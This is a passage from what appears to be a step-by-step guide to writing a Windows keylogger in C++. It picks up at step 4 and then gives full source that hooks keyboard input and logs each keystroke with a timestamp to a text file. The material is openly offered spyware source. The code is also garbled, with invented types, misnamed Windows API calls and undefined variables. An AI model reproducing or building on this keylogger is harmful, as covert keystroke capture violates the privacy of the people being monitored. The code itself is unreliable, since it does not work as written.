4. **Attach the Hook Function**: Assign the `keyboardHook` function to the hook.

5. **Check Hook Installation**: Verify the hook was set with the return value of `SetWindowsHook`.

6. **Message Loop**: Use `GetMessage` in a loop to process events. Check each message to see if it's a keyboard event.

7. **Process Key Events**: If the event is a key press (KEYDOWN), log the keystroke to a file.

8. **Logout and Cleanup**: Uninstall the hook and clean up resources when the application ends.

### Code

```cpp
// Include necessary headers
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>

using namespace std;

// Function prototype for the keyboard hook
void keyboardHook(int nCode, int wParam, struct HWND hwnd, struct WEvent *event);

// Structure to store log file
struct KeyLog {
    string key;
    string timestamp;
};

// Function to initialize the log file
void initLogFile(string filename) {
    ofstream logFile;
    logFile.open(filename, fstream::app);
    if (!logFile.is_open()) {
        cout << "Error: Could not create log file." << endl;
        return;
    }
    return;
}

// Function to write to log file
void writeLog(const KeyLog& log, ofstream& logFile) {
    logFile << log.key << " - " << log.timestamp << endl;
}

// Function to get the current user's documents path
string getUserDocumentsPath() {
    string path = "C:\\Users\\";
    // Replace with code to get the current user's profile path
    // For example, using GetUserName function
    return path;
}

// Main function to setup the keylogger
void setupKeylogger(const char* filename) {
    // Initialize the log file
    initLogFile(filename);

    // Set up the keyboard hook
    HHOOK hhook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);

    // Check if the hook was set
    if (hhook == NULL) {
        cout << "Error: Could not set keyboard hook." << endl;
        return;
    }

    // Process messages
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            keyboardHook(msg.wParam, msg.hwnd, msg.lParam);
        }
    }

    // Cleanup the hook
    Unhook(hhook);
    cout << "Keyboard hook removed." << endl;
}

// Keyboard hook function
void keyboardHook(int nCode, int wParam, struct HWND hwnd, struct WEvent* event) {
    if (wParam == VK_KEYDOWN) {
        KeyLog log;
        log.timestamp =asctime(&event->time);
        log.timestamp = log.timestamp.substr(0, 19); // Get only date and time
        log.key = "Key pressed: ";
        log.key += static_cast<char>(event->wKey);
        writeLog(log, logFile);
    }
    return 0;
}

// Main function
int main() {
    // Replace "KeystrokeLog.txt" with your desired filename
    const char* logFile = "KeystrokeLog.txt";
    setupKeylogger(logFile);
    return 0;
}
```

